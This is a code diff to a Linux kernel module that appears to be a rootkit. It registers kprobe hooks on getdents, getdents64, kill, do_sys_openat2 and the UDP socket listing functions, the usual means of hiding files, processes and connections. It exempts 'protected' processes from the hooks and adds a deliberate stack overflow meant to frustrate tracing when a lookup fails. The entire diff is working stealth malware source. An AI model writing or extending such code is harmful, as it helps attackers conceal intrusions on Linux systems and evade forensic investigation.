@@ -1,4 +1,5 @@
 #include "inc/hook.h"
+#include "inc/cmds.h"
 #include "inc/util.h"
 
 #include <linux/kprobes.h>
@@ -16,14 +17,17 @@ struct hook hooks[] = {
     {.func = h_udp4_seq_show, .kp = {.symbol_name = "udp4_seq_show"}},
     {.func = h_udp6_seq_show, .kp = {.symbol_name = "udp6_seq_show"}},
 
+    {.func = h_getdents64, .kp = {.symbol_name = "__x64_sys_getdents64"}},
     {.func = h_getdents, .kp = {.symbol_name = "__x64_sys_getdents"}},
+
     {.func = h_kill, .kp = {.symbol_name = "__x64_sys_kill"}},
-    /*{.num = __NR_openat, .name = "openat", .func = h_openat},
-    {.num = __NR_statx, .name = "statx", .func = h_statx},
+    
+    {.func = h_do_sys_openat2, .kp = {.symbol_name = "do_sys_openat2"}},
+    
+    /*{.num = __NR_statx, .name = "statx", .func = h_statx},
     {.num = __NR_chdir, .name = "chdir", .func = h_chdir},
     {.num = __NR_write, .name = "write", .func = h_write},
     {.num = __NR_read, .name = "read", .func = h_read},
-    {.num = __NR_open, .name = "open", .func = h_openat},
     {.num = __NR_kill, .name = "kill", .func = h_kill},*/
 };
 
@@ -31,6 +35,10 @@ struct hook hooks[] = {
 
 int __hook_pre_handler(struct kprobe *kp, struct pt_regs *r) {
   uint8_t i = 0;
+
+  // if the processes is protected, then it's trusted and we can ignore the hooks
+  if(is_process_protected(current->pid))
+    return 0;
 
   // clang-format off
 
@@ -103,10 +111,15 @@ bool hooks_install(void) {
 }
 
 void hooks_uninstall(void) {
+  struct hook *h = NULL;
   uint8_t i = 0;
 
-  for (; i < hook_count(); i++)
-    unregister_kprobe(&hooks[i].kp);
+  for (; i < hook_count(); i++){
+    h = &hooks[i];
+
+    debgf("unhooked %s (0x%px => 0x%px)", h->kp.symbol_name, h->func, h->kp.addr);
+    unregister_kprobe(&h->kp);
+  }
 }
 
 void *hooks_find(const char *symbol) {
@@ -117,6 +130,15 @@ void *hooks_find(const char *symbol) {
       return hooks[i].kp.addr;
   }
 
-  debg("we are sooo fucked");
+  // if we cant find the original function we can just panic in debug mode
+  if(SHRK_DEBUG)
+    panic("original call not found for %s", symbol);
+
+  // otherwise lets fuck the stack to make sure functions doesnt get traced back (most likely will cause overflow panic bc of canary)
+  else {
+    char buf[1];
+    memset(buf, 0, 1000);
+  }
+
   return NULL;
 }
